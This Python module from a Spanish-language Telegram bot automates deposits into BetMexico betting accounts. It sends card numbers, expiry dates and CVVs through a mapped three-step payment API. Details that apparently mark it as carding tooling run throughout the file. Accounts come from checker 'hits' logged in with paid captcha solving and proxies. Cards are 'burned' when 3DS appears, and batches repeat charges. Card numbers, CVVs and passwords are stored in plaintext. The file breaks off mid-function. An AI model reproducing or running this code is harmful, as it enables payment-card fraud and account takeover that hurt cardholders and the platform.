#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
BetMexico Bot — Módulo de Automatización de Depósitos
Ejecuta depósitos reales vía processorpay.com usando el flujo mapeado:
  PASO 1: POST BeginDepositWithCard → orderId + transactionId
  PASO 2: POST processorpay.com/makePayment → BANK_APPROVED | BANK_REJECTED
  PASO 3: GET bankTransaction/{transactionId} → confirmación final

Marriage tarjeta-cuenta: una tarjeta solo puede usarse en UNA cuenta.
Depósitos programados: misma cuenta, N veces, con intervalo configurable.
"""

import asyncio
import logging
from typing import Dict, List, Optional

import httpx
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import ContextTypes

from betmexico_config import (
    logger, LOGO, now_mx,
    ASK_PROXY, WAIT_DEPOSIT_CARD, WAIT_DEPOSIT_AMOUNT, WAIT_DEPOSIT_SCHEDULE,
    is_admin, is_any_admin, user_tag, get_admin_proxy,
)
from betmexico_db import db
from betmexico_utils import safe_reply, _safe_answer, _parse_card_input, _format_card_masked

# =============================================================================
# CONSTANTES DEL FLUJO
# =============================================================================

BETMEXICO_PAYMENTS_URL = "https://paymentsapi.betmexico.mx"
PROCESSORPAY_URL = "https://processorpay.com/sanval/api/IframeGames/makePayment"


def _proxy_url(proxy: Dict) -> str:
    """Convierte proxy dict → URL para httpx."""
    server = proxy["server"]
    username = proxy.get("username", "")
    password = proxy.get("password", "")
    if username:
        return f"http://{username}:{password}@{server}"
    return f"http://{server}"

QUICK_AMOUNTS = [
    ("💵 $49.94", "deposit_amount_4994", 49.94),
    ("💵 $490.94", "deposit_amount_49094", 490.94),
]


# =============================================================================
# CAPA HTTP — FUNCIONES PURAS (sin Telegram)
# =============================================================================

async def begin_deposit(client: httpx.AsyncClient, jwt: str, amount: float) -> Dict:
    """
    PASO 1: Inicia depósito en BetMexico.
    Retorna: {"orderId": str, "transactionId": str} o {"error": str}
    """
    try:
        resp = await client.post(
            f"{BETMEXICO_PAYMENTS_URL}/api/wallet/deposit/BeginDepositWithCard",
            json={"amount": f"{amount:.2f}", "theme": 1},
            headers={"Authorization": f"Bearer {jwt}", "Content-Type": "application/json"},
            timeout=20.0,
        )
        data = resp.json()
        if resp.status_code != 200:
            return {"error": f"HTTP {resp.status_code}: {data}"}
        order_id = data.get("orderId", "")
        txn_id = data.get("transactionId", "")
        if not order_id or not txn_id:
            return {"error": f"Respuesta inválida: {data}"}
        return {"orderId": order_id, "transactionId": txn_id}
    except Exception as e:
        return {"error": f"begin_deposit: {e}"}


async def submit_card(
    client: httpx.AsyncClient,
    cc_number: str,
    cc_exp: str,
    cc_cvv: str,
    order_id: str,
) -> Dict:
    """
    PASO 2: Envía datos de tarjeta a processorpay.com (sin auth).
    cc_exp debe estar en formato MMYY (4 dígitos, sin slash).
    Retorna: {"resultCode": "BANK_APPROVED"|"BANK_REJECTED", ...} o {"error": str}
    """
    try:
        # Normalizar expiry: "MM/YY" → "MMYY"
        cc_exp_clean = cc_exp.replace("/", "").strip()
        resp = await client.post(
            PROCESSORPAY_URL,
            json={"ccNumber": cc_number, "ccExp": cc_exp_clean, "ccCvv": cc_cvv, "orderId": order_id},
            headers={"Content-Type": "application/json"},
            timeout=30.0,
        )
        data = resp.json()
        return data
    except Exception as e:
        return {"error": f"submit_card: {e}"}


async def check_transaction(client: httpx.AsyncClient, jwt: str, transaction_id: str) -> Dict:
    """
    PASO 3: Verifica estado final de la transacción.
    Retorna: {"transactionStatus": int, ...} o {"error": str}
    """
    try:
        resp = await client.get(
            f"{BETMEXICO_PAYMENTS_URL}/api/wallet/bankTransaction/{transaction_id}",
            headers={"Authorization": f"Bearer {jwt}"},
            timeout=15.0,
        )
        return resp.json()
    except Exception as e:
        return {"error": f"check_transaction: {e}"}


async def get_account_jwt(email: str, password: str, proxy: Optional[Dict] = None) -> Optional[str]:
    """
    Obtiene el JWT de autenticación de una cuenta haciendo login.
    Usa BetmexicoApiChecker → extrae token de result["api"].
    Retorna el JWT string o None si falla.
    """
    from betmexico_login_api import BetmexicoApiChecker, CaptchaTokenPool
    from betmexico_config import get_admin_proxy, BMX_CAPSOLVER_KEY

    try:
        proxy_cfg = proxy or get_admin_proxy()
        pool = CaptchaTokenPool(proxy=proxy_cfg, solver_key=BMX_CAPSOLVER_KEY, solver_service="capsolver")
        await pool.start(target_size=1)
        captcha_token = await pool.get_token(timeout=90)
        await pool.stop()

        if not captcha_token:
            logger.error(f"[DEPOSIT] No se obtuvo captcha token para {email}")
            return None

        async with BetmexicoApiChecker(proxy=proxy_cfg) as checker:
            result = await checker.test_login(email, password, captcha_token=captcha_token)

        if result.get("status") != "LIVE":
            logger.warning(f"[DEPOSIT] Login fallido para {email}: {result.get('status')}")
            return None

        # El JWT está en la respuesta cruda de la API de login
        api_data = result.get("api", {})
        jwt = api_data.get("token") or api_data.get("jwt") or api_data.get("accessToken")
        if not jwt:
            logger.error(f"[DEPOSIT] No se encontró JWT en respuesta API para {email}. Keys: {list(api_data.keys())}")
            return None

        return jwt
    except Exception as e:
        logger.error(f"[DEPOSIT] Error get_account_jwt({email}): {e}", exc_info=True)
        return None


async def execute_single_deposit(
    email: str,
    password: str,
    card_number: str,
    card_expiry: str,
    card_cvv: str,
    amount: float,
    tested_by: int,
    proxy: Optional[Dict] = None,
    jwt: Optional[str] = None,
) -> Dict:
    """
    Orquesta los 3 pasos del depósito.
    Retorna:
      {"success": True, "result_code": "BANK_APPROVED", "amount": float, "txn_id": str}
      {"success": False, "error": str}
    """
    proxy_cfg = proxy or get_admin_proxy()

    # Obtener JWT si no se pasó uno
    if not jwt:
        jwt = await get_account_jwt(email, password, proxy=proxy_cfg)
        if not jwt:
            return {"success": False, "error": "No se pudo autenticar la cuenta (captcha o login fallido)"}

    async with httpx.AsyncClient(timeout=30.0, verify=False, proxy=_proxy_url(proxy_cfg)) as client:
        # PASO 1
        step1 = await begin_deposit(client, jwt, amount)
        if "error" in step1:
            return {"success": False, "error": f"Paso 1 falló: {step1['error']}"}

        order_id = step1["orderId"]
        txn_id = step1["transactionId"]

        # PASO 2
        step2 = await submit_card(client, card_number, card_expiry, card_cvv, order_id)
        if "error" in step2:
            return {"success": False, "error": f"Paso 2 falló: {step2['error']}"}

        result_code = step2.get("resultCode", "UNKNOWN")
        payload = step2.get("payload", {})
        is_3ds = payload.get("threeDs", False)
        approved = result_code == "BANK_APPROVED"

        # PASO 3 (verificación opcional si no es 3DS)
        txn_status = 0
        if not is_3ds:
            step3 = await check_transaction(client, jwt, txn_id)
            txn_status = step3.get("transactionStatus", 0) if "error" not in step3 else 0

    # Lógica de descarte por 3DS
    if is_3ds:
        logger.warning(f"[DEPOSIT] 3DS DETECTADO para tarjeta {card_number}. Quemando...")
        db.burn_card(card_number, reason="3DS_REQUIRED")
        db.record_deposit_result(
            email=email, password=password, card_number=card_number,
            card_expiry=card_expiry, card_cvv=card_cvv, amount=amount,
            result="3DS_BURNED", tested_by=tested_by,
            notes=f"3DS Detectado | orderId:{order_id}"
        )
        return {"success": False, "result_code": "3DS_REQUIRED", "burned": True, "error": "3DS_REQUIRED — Tarjeta descartada"}

    # Guardar resultado normal en BD
    notes = f"Auto-depósito | orderId:{order_id} | txnStatus:{txn_status}"
    db.record_deposit_result(
        email=email,
        password=password,
        card_number=card_number,
        card_expiry=card_expiry,
        card_cvv=card_cvv,
        amount=amount,
        result="BANK_APPROVED" if approved else "BANK_REJECTED",
        tested_by=tested_by,
        notes=notes,
    )
    db.update_card_stats(card_number, approved)

    if approved:
        # Si aprueba directo sin 3DS, asegurar Grade A si era ? o similar
        acc = db.get_account_by_email(email)
        if acc and acc.get("grade") in ("?", "F", "D"):
            db.update_account_grade(email, "A")
            
        return {"success": True, "result_code": result_code, "amount": amount, "txn_id": txn_id}
    else:
        decline_reason = payload.get("message") or payload.get("statusDescription") or "decline genérico"
        return {"success": False, "result_code": result_code, "error": f"{result_code} — {decline_reason}"}


# =============================================================================
# TAREAS EN BACKGROUND (depósitos programados)
# =============================================================================

async def _run_single_deposit_task(
    email: str,
    password: str,
    card_number: str,
    card_expiry: str,
    card_cvv: str,
    amount: float,
    chat_id: int,
    user_id: int,
    bot,
):
    """Task background para un depósito individual."""
    card_display = card_number if is_any_admin(user_id) else _format_card_masked(card_number)
    try:
        await bot.send_message(chat_id, f"⏳ Ejecutando depósito ${amount:.2f} en `{email}`...", parse_mode="Markdown")
        result = await execute_single_deposit(email, password, card_number, card_expiry, card_cvv, amount, user_id)
        if result["success"]:
            msg = (
                f"{LOGO}✅ *BANK_APPROVED*\n\n"
                f"📧 `{email}`\n"
                f"💳 `{card_display}`\n"
                f"💵 ${amount:.2f}\n"
                f"🆔 `{result.get('txn_id', 'N/A')}`"
            )
        else:
            is_3ds = result.get("result_code") == "3DS_REQUIRED"
            status_text = "🔥 *3DS DETECTED*" if is_3ds else "❌ *BANK_REJECTED*"
            msg = (
                f"{LOGO}{status_text}\n\n"
                f"📧 `{email}`\n"
                f"💳 `{card_display}`\n"
                f"💵 ${amount:.2f}\n"
                f"⚠️ {result.get('error', 'Sin razón de decline')}"
            )
            if is_3ds:
                msg += "\n\n🚫 _Tarjeta quemada y descartada automáticamente._"
        await bot.send_message(chat_id, msg, parse_mode="Markdown")
    except Exception as e:
        logger.error(f"[DEPOSIT][TASK] Error inesperado: {e}", exc_info=True)
        await bot.send_message(chat_id, f"❌ Error inesperado en depósito: {e}")


async def _run_scheduled_deposits_task(
    email: str,
    password: str,
    card_number: str,
    card_expiry: str,
    card_cvv: str,
    amount: float,
    times: int,
    interval: int,
    chat_id: int,
    user_id: int,
    bot,
):
    """Task background para N depósitos programados con intervalo en segundos."""
    card_display = card_number if is_any_admin(user_id) else _format_card_masked(card_number)
    await bot.send_message(
        chat_id,
        f"{LOGO}🔁 *Iniciando {times} depósitos programados*\n\n"
        f"📧 `{email}`\n💳 `{card_display}`\n💵 ${amount:.2f} c/u\n⏱ {interval}s entre depósitos",
        parse_mode="Markdown",
    )
    approved_count = 0
    rejected_count = 0

    # PASO 0: Obtener JWT una sola vez para todo el batch
    from betmexico_config import get_admin_proxy
    jwt = await get_account_jwt(email, password, proxy=get_admin_proxy())
    if not jwt:
        await bot.send_message(chat_id, "❌ *Error de inicio:* No se pudo autenticar la cuenta (captcha/login). Batch cancelado.", parse_mode="Markdown")
        return

    for i in range(1, times + 1):
        try:
            result = await execute_single_deposit(
                email=email, password=password, 
                card_number=card_number, card_expiry=card_expiry, card_cvv=card_cvv, 
                amount=amount, tested_by=user_id, jwt=jwt
            )
            if result["success"]:
                approved_count += 1
                status_line = f"✅ #{i} APPROVED ${amount:.2f}"
            else:
                is_3ds = result.get("result_code") == "3DS_REQUIRED"
                status_line = f"🔥 #{i} 3DS DETECTED — DESCARTADA" if is_3ds else f"❌ #{i} REJECTED — {result.get('result_code', 'ERR')}"
                rejected_count += 1
                
                if is_3ds:
                    await bot.send_message(chat_id, status_line)
                    await bot.send_message(chat_id, "⏱ *Cooldown iniciado:* Esperando 60s por seguridad de la cuenta...", parse_mode="Markdown")
                    await asyncio.sleep(60)
                    # No paramos el loop, pero la tarjeta ya se quemó en execute_single_deposit
                    # El siguiente intento usará la misma tarjeta? NO, el loop usa la misma.
                    # Robert dijo: "pasa a la sig tarjeta". Pero este loop es de REPETICIÓN de la misma.
                    # Entonces si salta 3DS en un REPEAT, debemos CANCELAR el resto del batch.
                    await bot.send_message(chat_id, "⚠️ *Batch cancelado:* La tarjeta ya no es válida para esta cuenta.")
                    break

            await bot.send_message(chat_id, status_line)

            if i < times:
                await bot.send_message(chat_id, f"⏳ Próximo depósito en {interval}s ({i}/{times} completados)")
                await asyncio.sleep(interval)

        except Exception as e:
            rejected_count += 1
            logger.error(f"[DEPOSIT][SCHED] Intento {i} falló: {e}")
            await bot.send_message(chat_id, f"❌ #{i} Error: {e}")
            if i < times:
                await asyncio.sleep(interval)

    await bot.send_message(
        chat_id,
        f"{LOGO}🏁 *Batch completado*\n\n"
        f"✅ Aprobados: {approved_count}\n"
        f"❌ Rechazados: {rejected_count}\n"
        f"Total: {times}",
        parse_mode="Markdown",
    )


# =============================================================================
# HELPERS UI
# =============================================================================

def _build_amount_keyboard(extra_buttons: List = None) -> InlineKeyboardMarkup:
    row1 = [InlineKeyboardButton(label, callback_data=cbd) for label, cbd, _ in QUICK_AMOUNTS]
    rows = [row1, [InlineKeyboardButton("✏️ Otro monto", callback_data="deposit_amount_custom")]]
    if extra_buttons:
        rows.extend(extra_buttons)
    rows.append([InlineKeyboardButton("🔙 Cancelar", callback_data="deposit_cancel")])
    return InlineKeyboardMarkup(rows)


def _build_mode_keyboard() -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup([
        [InlineKeyboardButton("⚡ Individual (1 depósito)", callback_data="deposit_mode_single")],
        [InlineKeyboardButton("🔁 Programado (N depósitos)", callback_data="deposit_mode_scheduled")],
        [InlineKeyboardButton("🔙 Cancelar", callback_data="deposit_cancel")],
    ])


def _get_deposit_target(context: ContextTypes.DEFAULT_TYPE) -> Optional[Dict]:
    """Obtiene la cuenta target del contexto (viene de search.py o hit detail)."""
    return context.user_data.get("deposit_target") or context.user_data.get("payment_target")


# =============================================================================
# HANDLERS TELEGRAM
# =============================================================================

async def depositar_hit_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Entry point desde hit detail (botón depositar_hit_{idx})."""
    query = update.callback_query
    await _safe_answer(query)
    user_id = query.from_user.id

    try:
        idx = int(query.data.replace("depositar_hit_", ""))
        from betmexico_utils import get_session
        session = get_session(user_id)
        all_hits = session.all_hits or context.user_data.get("last_all_hits", [])

        if idx < 0 or idx >= len(all_hits):
            await query.message.reply_text("❌ Hit no encontrado.")
            return ASK_PROXY

        h = all_hits[idx]
        context.user_data["payment_target"] = {"email": h["email"], "password": h["password"], "hit_idx": idx}
    except Exception as e:
        logger.error(f"[DEPOSIT] depositar_hit_cb: {e}")
        await query.message.reply_text("❌ Error.")
        return ASK_PROXY

    # Reusar mismo flujo que la búsqueda
    return await depositar_start_cb(update, context)


async def depositar_start_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """
    Entry point del flujo de depósito.
    Se activa desde botón 'depositar_search' en search.py.
    Espera que 'payment_target' ya esté en context.user_data.
    """
    query = update.callback_query
    await _safe_answer(query)
    user_id = query.from_user.id

    target = _get_deposit_target(context)
    if not target:
        await query.message.reply_text("❌ No hay cuenta seleccionada. Usa /buscar primero.")
        return ASK_PROXY

    email = target["email"]
    password = target["password"]

    # Guardar target en clave dedicada para el flujo de depósito
    context.user_data["deposit_target"] = {"email": email, "password": password}

    # Ver tarjetas guardadas para esta cuenta
    saved_cards = db.get_account_cards(email, password)

    prompt = (
        f"{LOGO}💸 *Depósito automático*\n\n"
        f"📧 `{email}:{password}`\n\n"
    )

    keyboard_rows = []

    if saved_cards:
        prompt += f"💳 *Tarjetas guardadas ({len(saved_cards)}):*\n"
        for card in saved_cards[:3]:  # Máx 3
            cn = card["card_number"]
            display = cn if is_any_admin(user_id) else _format_card_masked(cn)
            exp = card.get("card_expiry", "??/??")
            approved = card.get("total_approved", 0)
            rejected = card.get("total_rejected", 0)
            prompt += f"  `{display}` exp `{exp}` — ✅{approved} ❌{rejected}\n"
            keyboard_rows.append([InlineKeyboardButton(
                f"💳 Usar {display} ({exp})",
                callback_data=f"deposit_use_card_{card['id']}"
            )])

    prompt += "\n_Formato: `NUMERO|MM/YY|CVV`_"
    keyboard_rows.append([InlineKeyboardButton("➕ Nueva tarjeta", callback_data="deposit_new_card")])
    keyboard_rows.append([InlineKeyboardButton("🔙 Cancelar", callback_data="deposit_cancel")])

    await query.message.reply_text(prompt, parse_mode="Markdown", reply_markup=InlineKeyboardMarkup(keyboard_rows))
    return WAIT_DEPOSIT_CARD


async def deposit_use_saved_card_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Usuario seleccionó una tarjeta guardada."""
    query = update.callback_query
    await _safe_answer(query)
    user_id = query.from_user.id

    try:
        card_id = int(query.data.replace("deposit_use_card_", ""))
        # Buscar la tarjeta en BD por ID
        cursor = db.conn.cursor()
        cursor.execute("SELECT * FROM account_cards WHERE id = ?", (card_id,))
        row = cursor.fetchone()
        if not row:
            await query.message.reply_text("❌ Tarjeta no encontrada.")
            return ASK_PROXY

        card = dict(row)
        context.user_data["deposit_card"] = {
            "card_number": card["card_number"],
            "card_expiry": card["card_expiry"],
            "card_cvv": card["card_cvv"],
        }

        display = card["card_number"] if is_any_admin(user_id) else _format_card_masked(card["card_number"])
        prompt = (
            f"💳 Tarjeta seleccionada: `{display}` exp `{card['card_expiry']}`\n\n"
            f"Selecciona el monto:"
        )
        await query.message.reply_text(prompt, parse_mode="Markdown", reply_markup=_build_amount_keyboard())
        return WAIT_DEPOSIT_AMOUNT

    except Exception as e:
        logger.error(f"[DEPOSIT] deposit_use_saved_card_cb: {e}")
        await query.message.reply_text("❌ Error seleccionando tarjeta.")
        return ASK_PROXY


async def deposit_new_card_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Usuario quiere ingresar nueva tarjeta."""
    query = update.callback_query
    await _safe_answer(query)

    target = _get_deposit_target(context)
    if not target:
        await query.message.reply_text("❌ Sesión expirada. Vuelve a buscar la cuenta.")
        return ASK_PROXY

    await query.message.reply_text(
        f"💳 Ingresa los datos de la tarjeta:\n\n"
        f"`NUMERO|MM/YY|CVV`\n\n"
        f"Ejemplo: `4000111122223333|03/28|123`",
        parse_mode="Markdown",
    )
    return WAIT_DEPOSIT_CARD


async def deposit_card_received(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Recibe tarjeta en formato pipe, valida marriage y procede al monto."""
    user_id = update.effective_user.id
    text = update.message.text.strip()

    # Ignorar si no estamos esperando tarjeta de depósito
    if not _get_deposit_target(context):
        return WAIT_DEPOSIT_CARD

    parsed = _parse_card_input(text)
    if "error" in parsed:
        await safe_reply(update, f"❌ {parsed['error']}\n\nFormato correcto: `NUMERO|MM/YY|CVV`", parse_mode="Markdown")
        return WAIT_DEPOSIT_CARD

    card_number = parsed["card_number"]
    target = _get_deposit_target(context)
    email = target["email"]
    password = target["password"]

    # Validar marriage y estatus: ¿esta tarjeta ya pertenece a otra cuenta o está quemada?
    existing = db.get_card_account(card_number)
    if existing:
        is_same_acc = (existing["account_email"] == email and existing["account_password"] == password)
        status = existing.get("status", "ACTIVE")
        
        if not is_same_acc:
            # Tarjeta casada con otra cuenta
            other_email = existing["account_email"]
            registrador = existing.get("registered_by_name", "Desconocido")
            history = db.get_card_deposit_history(card_number)
            approved = sum(1 for h in history if h.get("result") == "BANK_APPROVED")
            rejected = sum(1 for h in history if h.get("result") == "BANK_REJECTED")

            card_display = card_number if is_any_admin(user_id) else _format_card_masked(card_number)
            warn = (
                f"⚠️ *Tarjeta `{card_display}` ya está registrada*\n\n"
                f"📧 Cuenta: `{other_email}`\n"
                f"👤 Registrada por: {registrador}\n"
                f"📅 Desde: {existing.get('registered_at', '?')[:16]}\n\n"
                f"📊 Historial del bot:\n"
                f"  ✅ Aprobados: {approved} | ❌ Rechazados: {rejected}\n\n"
                f"❌ Usa otra tarjeta. Envía `NUMERO|MM/YY|CVV`:"
            )
            await safe_reply(update, warn, parse_mode="Markdown")
            return WAIT_DEPOSIT_CARD

        if status != "ACTIVE":
            # Tarjeta quemada en esta misma cuenta
            card_display = card_number if is_any_admin(user_id) else _format_card_masked(card_number)
            warn = (
                f"🔥 *Tarjeta `{card_display}` está QUEMADA ({status})*\n\n"
                f"Esta tarjeta ya tiró 3DS o fue rechazada anteriormente en esta cuenta.\n"
                f"❌ *No se puede reutilizar.* Usa otra tarjeta:"
            )
            await safe_reply(update, warn, parse_mode="Markdown")
            return WAIT_DEPOSIT_CARD

    # Tarjeta válida — guardar en contexto
    context.user_data["deposit_card"] = {
        "card_number": card_number,
        "card_expiry": parsed["card_expiry"],
        "card_cvv": parsed["card_cvv"],
    }

    card_display = card_number if is_any_admin(user_id) else _format_card_masked(card_number)
    await safe_reply(
        update,
        f"✅ Tarjeta `{card_display}` | exp `{parsed['card_expiry']}` — OK\n\nSelecciona el monto:",
        parse_mode="Markdown",
        reply_markup=_build_amount_keyboard(),
    )
    return WAIT_DEPOSIT_AMOUNT


async def deposit_amount_quick_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Selección rápida de monto ($49.94 o $490.94)."""
    query = update.callback_query
    await _safe_answer(query)

    amount_map = {cbd: amt for _, cbd, amt in QUICK_AMOUNTS}
    amount = amount_map.get(query.data)

    if not amount:
        await query.message.reply_text("❌ Monto inválido.")
        return ASK_PROXY

    context.user_data["deposit_amount"] = amount
    card = context.user_data.get("deposit_card", {})
    user_id = query.from_user.id
    card_display = card.get("card_number", "?") if is_any_admin(user_id) else _format_card_masked(card.get("card_number", "?"))

    await query.message.reply_text(
        f"💵 Monto: *${amount:.2f}*\n💳 `{card_display}`\n\n¿Cómo quieres depositar?",
        parse_mode="Markdown",
        reply_markup=_build_mode_keyboard(),
    )
    return ASK_PROXY


async def deposit_custom_amount_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Usuario quiere ingresar monto personalizado."""
    query = update.callback_query
    await _safe_answer(query)
    await query.message.reply_text("💵 Escribe el monto (solo número):\n\nEjemplo: `150` o `250.50`", parse_mode="Markdown")
    return WAIT_DEPOSIT_AMOUNT


async def deposit_custom_amount_received(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Recibe monto personalizado en texto."""
    text = update.message.text.strip().replace("$", "").replace(",", "")

    if not _get_deposit_target(context) or "deposit_card" not in context.user_data:
        return WAIT_DEPOSIT_AMOUNT

    try:
        amount = float(text)
        if amount <= 0:
            raise ValueError("Monto negativo")
    except ValueError:
        await safe_reply(update, "❌ Monto inválido. Escribe solo el número: `150` o `250.50`", parse_mode="Markdown")
        return WAIT_DEPOSIT_AMOUNT

    context.user_data["deposit_amount"] = amount
    card = context.user_data.get("deposit_card", {})
    user_id = update.effective_user.id
    card_display = card.get("card_number", "?") if is_any_admin(user_id) else _format_card_masked(card.get("card_number", "?"))

    await safe_reply(
        update,
        f"💵 Monto: *${amount:.2f}*\n💳 `{card_display}`\n\n¿Cómo quieres depositar?",
        parse_mode="Markdown",
        reply_markup=_build_mode_keyboard(),
    )
    return ASK_PROXY


async def deposit_mode_single_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Depósito individual — ejecutar ahora."""
    query = update.callback_query
    await _safe_answer(query)
    user_id = query.from_user.id

    target = _get_deposit_target(context)
    card = context.user_data.get("deposit_card")
    amount = context.user_data.get("deposit_amount")

    if not target or not card or not amount:
        await query.message.reply_text("❌ Datos incompletos. Reinicia con /buscar.")
        return ASK_PROXY

    email = target["email"]
    password = target["password"]
    card_number = card["card_number"]

    # Registrar marriage si es tarjeta nueva
    _register_card_marriage(card, email, password, user_id, user_tag(user_id))

    # Marcar cuenta en uso (auto-libera a las 6h)
    db.lock_account(email, user_id)

    # Lanzar task en background
    asyncio.create_task(_run_single_deposit_task(
        email=email,
        password=password,
        card_number=card_number,
        card_expiry=card["card_expiry"],
        card_cvv=card["card_cvv"],
        amount=amount,
        chat_id=query.message.chat_id,
        user_id=user_id,
        bot=query.get_bot(),
    ))

    _clear_deposit_context(context)
    await query.message.reply_text("🚀 Depósito iniciado. Te avisaré cuando termine.")
    return ASK_PROXY


async def deposit_mode_scheduled_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Depósito programado — pedir N y intervalo."""
    query = update.callback_query
    await _safe_answer(query)

    if not _get_deposit_target(context) or "deposit_card" not in context.user_data:
        await query.message.reply_text("❌ Datos incompletos.")
        return ASK_PROXY

    await query.message.reply_text(
        f"🔁 *Depósitos programados*\n\n"
        f"Envía: `VECES|SEGUNDOS`\n\n"
        f"Ejemplo: `3|30` = 3 depósitos con 30 segundos entre cada uno\n"
        f"Mínimo 10 segundos entre depósitos.",
        parse_mode="Markdown",
    )
    return WAIT_DEPOSIT_SCHEDULE


async def deposit_schedule_received(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Recibe configuración N|INTERVAL y lanza batch."""
    user_id = update.effective_user.id
    text = update.message.text.strip()

    target = _get_deposit_target(context)
    card = context.user_data.get("deposit_card")
    amount = context.user_data.get("deposit_amount")

    if not target or not card or not amount:
        return ASK_PROXY

    try:
        parts = text.split("|")
        times = int(parts[0].strip())
        interval = int(parts[1].strip())
        if times < 1 or times > 50:
            raise ValueError("Fuera de rango")
        if interval < 10:
            raise ValueError("Intervalo mínimo 10 segundos")
    except (ValueError, IndexError):
        await safe_reply(
            update,
            "❌ Formato inválido. Usa `VECES|SEGUNDOS`\nEjemplo: `3|30`\n\nMínimo 10 segundos, máximo 50 depósitos.",
            parse_mode="Markdown",
        )
        return WAIT_DEPOSIT_SCHEDULE

    email = target["email"]
    password = target["password"]
    card_number = card["card_number"]

    # Registrar marriage si es tarjeta nueva
    _register_card_marriage(card, email, password, user_id, user_tag(user_id))

    # Marcar cuenta en uso (auto-libera a las 6h)
    db.lock_account(email, user_id)

    # Lanzar batch en background
    asyncio.create_task(_run_scheduled_deposits_task(
        email=email,
        password=password,
        card_number=card_number,
        card_expiry=card["card_expiry"],
        card_cvv=card["card_cvv"],
        amount=amount,
        times=times,
        interval=interval,
        chat_id=update.effective_chat.id,
        user_id=user_id,
        bot=update.get_bot(),
    ))

    _clear_deposit_context(context)
    await safe_reply(update, f"🚀 Batch iniciado: {times}× ${amount:.2f} cada {interval}s\nTe reporto cada resultado.")
    return ASK_PROXY


async def deposit_cancel_cb(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    """Cancela el flujo de depósito."""
    query = update.callback_query
    await _safe_answer(query)
    _clear_deposit_context(context)
    await query.message.reply_text("❌ Depósito cancelado.")
    return ASK_PROXY


# =============================================================================
# HELPERS INTERNOS
# =============================================================================

def _register_card_marriage(card: Dict, email: str, password: str, user_id: int, user_name: str):
    """Registra marriage tarjeta-cuenta si no existe aún."""
    existing = db.get_card_account(card["card_number"])
    if not existing:
        db.register_card_to_account(
            card_number=card["card_number"],
            card_expiry=card["card_expiry"],
            card_cvv=card["card_cvv"],
            email=email,
            password=password,
            registered_by=user_id,
            registered_by_name=user_name,
        )


def _clear_deposit_context(context: ContextTypes.DEFAULT_TYPE):
    """Limpia datos del flujo de depósito del contexto."""
    for key in ("deposit_target", "deposit_card", "deposit_amount"):
        context.user_data.pop(key, None)


# =============================================================================
# COMANDO RÁPIDO /dep
# =============================================================================

async def dep_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """
    Atajo de depósito rápido desde Telegram.
    Uso: /dep email:password|ccNum|ccExp|ccCvv|monto
    Ejemplo: /dep user@mail.com:pass123|4152111122223333|01/27|123|49.94

    También acepta formato separado por espacios en lugar de pipes.
    """
    user_id = update.effective_user.id
    if not is_any_admin(user_id):
        return

    args_raw = " ".join(context.args).strip() if context.args else ""
    if not args_raw:
        await safe_reply(
            update,
            f"{LOGO}*Uso del comando /dep:*\n\n"
            "`/dep email:pass|ccNum|mm|aaaa|cvv|monto`\n\n"
            "Ejemplo:\n"
            "`/dep juan@mail.com:pass|4152111122223333|01|2027|123|49.94`",
            parse_mode="Markdown",
        )
        return

    # Intentar detectar el combo email:pass al inicio (puede estar separado por espacio o pipe)
    # Ejemplo: /dep user@mail.com:pass 4152...
    args_text = " ".join(context.args).strip()
    
    # Buscar el combo al principio del mensaje
    combo_match = re.search(r"(\S+@[^:]+:[^| \n]+)", args_text)
    if not combo_match:
        # Intentar fallback si no tiene @ (username:pass)
        combo_match = re.search(r"([^:| \n]+:[^| \n]+)", args_text)
    
    if not combo_match:
        await safe_reply(update, "❌ No se detectó el combo `email:password` al inicio.", parse_mode="Markdown")
        return
        
    combo = combo_match.group(1).strip()
    card_noisy_text = args_text.replace(combo, "").strip()
    
    # Si quitamos el combo y nos queda nada, error
    if not card_noisy_text:
        await safe_reply(update, "❌ Por favor incluye los datos de la tarjeta después del combo.", parse_mode="Markdown")
        return

    # Usar el parser inteligente de utils
    parsed = _parse_card_input(card_noisy_text)
    if "error" in parsed:
        await safe_reply(update, f"❌ {parsed['error']}\n\n💡 Puedes enviar los datos desordenados o separados por pipes.", parse_mode="Markdown")
        return

    cc_number = parsed["card_number"]
    cc_exp = parsed["card_expiry"]
    cc_cvv = parsed["card_cvv"]
    amount = parsed["amount"] if parsed["amount"] > 0 else 49.94 # Default si no se detecta

    colon_idx = combo.rfind(":")
    email, password = combo[:colon_idx].strip(), combo[colon_idx + 1:].strip()

    # Validar marriage
    existing = db.get_card_account(cc_number)
    if existing and (existing["account_email"] != email or existing["account_password"] != password):
        card_display = _format_card_masked(cc_number)
        await safe_reply(
            update,
            f"⚠️ Tarjeta `{card_display}` ya registrada en `{existing['account_email']}`",
            parse_mode="Markdown",
        )
        return

    # Marcar en uso
    db.lock_account(email, user_id)

    await safe_reply(
        update,
        f"{LOGO}⏳ *Ejecutando depósito rápido*\n\n"
        f"📧 `{email}:{password}`\n"
        f"💳 `{_format_card_masked(cc_number)}`\n"
        f"💵 ${amount:.2f}",
        parse_mode="Markdown",
    )

    result = await execute_single_deposit(
        email=email,
        password=password,
        card_number=cc_number,
        card_expiry=cc_exp,
        card_cvv=cc_cvv,
        amount=amount,
        tested_by=user_id,
    )

    # Registrar marriage si nueva
    if not existing:
        db.register_card_to_account(
            card_number=cc_number,
            card_expiry=cc_exp,
            card_cvv=cc_cvv,
            email=email,
            password=password,
            registered_by=user_id,
            registered_by_name=user_tag(user_id),
        )

    if result["success"]:
        msg = (
            f"{LOGO}✅ *BANK_APPROVED*\n\n"
            f"📧 `{email}:{password}`\n"
            f"💵 ${amount:.2f}\n"
